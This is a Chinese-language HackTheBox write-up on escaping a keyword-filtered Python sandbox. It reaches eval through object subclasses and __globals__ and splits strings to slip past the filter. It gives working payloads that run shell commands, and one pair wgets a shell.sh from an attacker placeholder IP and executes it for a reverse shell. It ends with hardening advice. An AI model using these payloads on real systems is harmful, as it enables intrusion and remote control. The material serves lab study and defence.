
> 今天在做`HackTheBox`的时候遇到的靶机是`code`。在`5000`端口有一个在线python代码执行窗口。
> 
> 众所周知，可以在`py`里执行命令行的命令如`ls`、`pwd`等，自然可以实现文件读取，甚至`reverse shell`了。因此，一般都会施加额外限制。比如这台靶机的限制就极为粗糙。用的是类似与`string.contains("RESTRICTED WORDS")`的方法，限制了诸如`os`、`import`、`eval`等关键词。今天，我们来研究一下如何绕过这种限制。


## eval函数

> **eval()** 函数可以用来执行一个字符串表达式，并返回表达式的值。

```python
namespace = {'a': 2, 'b': 3}  
result = eval("a + b", namespace)  
print(result)  # 输出: 5
```

能把字符串转成命令，就存在危险。

```python
eval("__import__('os').system('ls /home/killua')")
```

我们就要利用它的这个特性。但是，我们没有办法在代码里出现`eval`这个字符串，怎么办？如果只是字符串可以用拼接绕过（如违禁词`Killua`可以看作`"Kil"+"lua"`），函数名呢？

## 寻找Eval函数

先看一段代码，然后让我们了解一下原理：

```python
for i in range(500):
    try:
        x = ''.__class__.__bases__[0].__subclasses__()[i].__init__.__globals__['__buil'+'tins__']
        if 'ev'+'al' in x:
            print(i)
    except Exception as e:
        continue
```

- `''`: 我们从一个最基本的 Python 对象开始，这里是一个空字符串。任何其他基本对象（比如 `0`，`[]`，`{}` 等）也可以作为起点，只要它们能够最终向上追溯到 `object` 类。
- `.__class__`: 访问对象的 `__class__` 属性，获取它的类型。对于空字符串 `''`，它的类型是 `<class 'str'>`。
- `.__bases__`: 访问类型的 `__bases__` 属性，获取它的所有直接基类组成的元组。对于 `str` 类，它的直接基类是 `object`，所以 `str.__bases__` 是 `(<class 'object'>,)`。
- `[0]`: 访问元组的第一个元素。在这里，我们获取了所有 Python 类的根基类 `<class 'object'>`。
- `.__subclasses__()`: 调用 `object` 类的 `__subclasses__()` 方法。这个方法会返回一个**当前已知的所有直接继承自 `object` 类的子类**的列表。这个列表包含了许多 Python 内部用于实现各种功能的类，比如与 I/O、网络、线程、进程等相关的内部类。
- `[i]`: 从 `__subclasses__()` 返回的列表中按索引 `i` 获取一个特定的类。**这是关键且依赖于环境的部分。** 代码假设在某个特定的索引 `i` 位置上的类，其内部结构（特别是它的构造函数 `__init__` 的全局作用域）能够访问到 Python 的内置函数。哪些类可能满足这个条件呢？通常是那些与执行环境、解释器核心功能、I/O 或多线程/多进程相关的内部类。它们的 `__init__` 方法在执行时，其全局字典通常会包含对 `__builtins__` 的引用。
- `.__init__`: 访问通过索引 `[i]` 获取到的那个类的 `__init__` 方法（构造函数）。这是一个函数对象。
- `.__globals__`: 访问函数对象的 `__globals__` 属性。每个函数对象都有一个 `__globals__` 属性，它是一个字典，包含了该函数定义时所处的全局命名空间。对于 Python 核心库或内置功能的函数来说，这个全局字典通常包含了对 `__builtins__` 的引用。
- `['__buil'+'tins__']`: 从 `__globals__` 字典中通过键 `'__builtins__'` 获取到 Python 的内置命名空间对象。这里使用了字符串拼接 `'__buil' + 'tins__'` 来构造键名，是为了**绕过那些直接过滤掉 `"__builtins__"` 这个字符串的防御机制**。`__builtins__` 对象包含了所有内置函数（如 `print`, `len`, `open`, `eval` 等）、内置异常和内置常量。
- `['ev'+'al']`: 从获取到的 `__builtins__` 对象中通过键 `'eval'` 获取到 `eval` 函数本身。同样使用了字符串拼接 `'ev' + 'al'` 来构造键名，**绕过直接过滤 `"eval"` 字符串的防御机制**。

假设我们找到的`i`其中一个是`80`：

```python
print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("ls /").re'+'ad()'))

```

- `__import__("os")`: 这是 Python 动态导入模块的方式。这里使用了字符串拼接 `'__imp' + 'ort__'` 和 `'o' + 's'` 来构造模块名，**同样是为了绕过直接过滤 `"import"` 和 `"os"` 字符串的防御机制**。它会导入 `os` 模块。
- `.popen("ls /")`: 调用 `os` 模块中的 `popen` 函数。`os.popen()` 函数可以在一个子 Shell 中执行一个命令行命令（在这里是 `ls /`），并返回一个文件对象，通过它可以读取命令的标准输出。
- `.read()`: 读取 `os.popen("ls /")` 返回的文件对象的所有内容，即 `ls /` 命令的输出结果。

执行`reverse shell`上传连接：

```python
print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("wget 你的IP:你的端口/shell.sh -O /tmp/shell.sh").re'+'ad()'))
 
print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("bash /tmp/shell.sh").re'+'ad()'))
```

## Python的结构

- `__class__`: 每个 Python 对象都有，指向创建该对象的类型。
- `__bases__`: 每个类型（类）都有，是一个元组，包含该类直接继承的所有基类。
- `__subclasses__()`: 这是一个方法，只有类对象有，调用它会返回所有直接继承自该类的子类列表。`object.__subclasses__()` 是获取系统中已知的大量内部类的重要入口。
- `[i]` 或 `[80]`: 这是列表索引操作，从 `__subclasses__()` 返回的列表中取出一个元素，这个元素是一个类对象。
- `__init__`: 类的构造函数方法，是一个函数对象。
- `__globals__`: 函数对象有，指向该函数定义时的全局变量字典。
- `__builtins__`: 在很多模块或核心函数的全局命名空间中都有这个引用，指向 Python 内置模块或内置函数字典。它本身包含了 `eval` 等内置函数。

## 安全问题

当然，我们看到了这样的安全限制是非常不合理的，因此：

- 将沙箱代码运行在一个**独立、权限极低**的用户下。
- 使用 容器（ Docker）来**限制文件系统访问**，只允许访问必要的目录。
- **禁用网络访问**，一个在线代码执行平台被执行了`reverse shell`了还是太超过了。
- **禁用执行其他程序**的能力（例如通过 AppArmor, SELinux 或 Linux Seccomp 等）。这样即使能调用 `os.popen("ls /")`，操作系统也会阻止 `ls` 命令的执行。